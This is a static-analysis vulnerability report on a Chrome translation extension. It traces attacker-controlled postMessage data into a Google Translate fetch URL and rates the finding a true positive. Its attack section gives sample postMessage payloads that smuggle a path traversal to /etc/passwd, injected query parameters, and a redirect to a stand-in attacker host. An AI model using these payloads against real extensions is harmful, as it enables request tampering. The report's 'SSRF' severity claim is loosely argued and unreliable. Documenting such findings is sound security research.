# CoCo Analysis: hgdlbdfhokgghlojnkonhkcdlamolagk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 5 (all represent the same vulnerability with different parameter combinations)

---

## Sink: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hgdlbdfhokgghlojnkonhkcdlamolagk/opgen_generated_files/cs_0.js
Line 473	window.addEventListener("message",function(e){..."changeLangInModalIFrame"==e.data.name&&translateSelectedText(null,e.data.souceLand,e.data.nativeLang)...

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hgdlbdfhokgghlojnkonhkcdlamolagk/opgen_generated_files/bg.js
Line 968	function requestTranslateText(e,a){...t=`https://translate.googleapis.com/translate_a/single?client=gtx&sl=${e.souceLand}&tl=${e.nativeLang}...`...

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 473)
window.addEventListener("message", function(e) {  // ← ANY webpage can send messages
  "loadModalIFrame" == e.data.name ? sendMessageToModalIFrame(responseMessage) :
  "closeModalIFrame" == e.data.name ? resetHistoryActions() :
  "changeLangInModalIFrame" == e.data.name &&
    translateSelectedText(null, e.data.souceLand, e.data.nativeLang)  // ← attacker controls souceLand and nativeLang
}, !1);

// Content script calls translateSelectedText which sends message to background
function translateSelectedText(e, t, a) {
  if ((!e || 0 === e.button) && selectedElementData.text && !(selectedElementData.text.length < 1)) {
    chrome.runtime.sendMessage({
      type: "requestTranslateText",
      options: {
        text: selectedElementData.text,
        selectedElementData: JSON.stringify(selectedElementData),
        souceLand: t,  // ← attacker-controlled
        nativeLang: a  // ← attacker-controlled
      }
    }, function(e) {
      document.querySelector(".hola-modal-iframe") ? sendMessageToModalIFrame(e) : createModalIFrame(e)
    })
  }
}

// Background script - Message handler (bg.js Line 965)
chrome.runtime.onMessage.addListener(function(e, t, n) {
  return "requestTranslateText" == e.type && loadLanguage(e.options, n), !0
});

// Background script - Constructs URL with attacker data (bg.js Line 968)
function requestTranslateText(e, a) {
  var n = Number.parseInt(89999 * Math.random() + 1e4),
    t = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=${e.souceLand}&tl=${e.nativeLang}&hl=${e.nativeLang}&dt=t&dt=bd&dj=1&source=icon&tk=${n}.${n}&q=${e.text}`;
    // ← attacker controls souceLand and nativeLang parameters

  fetch(t, {  // ← SSRF sink - fetches URL with attacker-controlled parameters
    method: "GET",
    mode: "cors",
    cache: "no-cache",
    credentials: "same-origin",
    headers: {"Content-Type": "application/json"},
    redirect: "follow",
    referrerPolicy: "no-referrer"
  }).then(e => e.json()).then(n => {
    n.tl = e.nativeLang,
    a(n)
  })
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage to content script

**Attack:**

```javascript
// Malicious webpage sends postMessage to extension content script:
window.postMessage({
  name: "changeLangInModalIFrame",
  souceLand: "en/../../../etc/passwd",  // Path traversal attempt
  nativeLang: "fr@attacker.com"  // Malicious parameter injection
}, "*");

// Or inject malicious characters to manipulate the Google Translate API request:
window.postMessage({
  name: "changeLangInModalIFrame",
  souceLand: "en&malicious=param",  // URL parameter injection
  nativeLang: "fr&redirect=http://attacker.com"
}, "*");
```

**Impact:** An attacker-controlled webpage can inject arbitrary values into the language parameters (souceLand, nativeLang) that are used to construct the Google Translate API URL. While the base URL (translate.googleapis.com) is hardcoded, the attacker controls query parameters which could be used for parameter injection attacks, potentially manipulating the API request or causing the extension to make requests with malicious parameters. This represents a Server-Side Request Forgery (SSRF) vulnerability where attacker-controlled data flows into fetch() URL construction with privileged extension permissions.
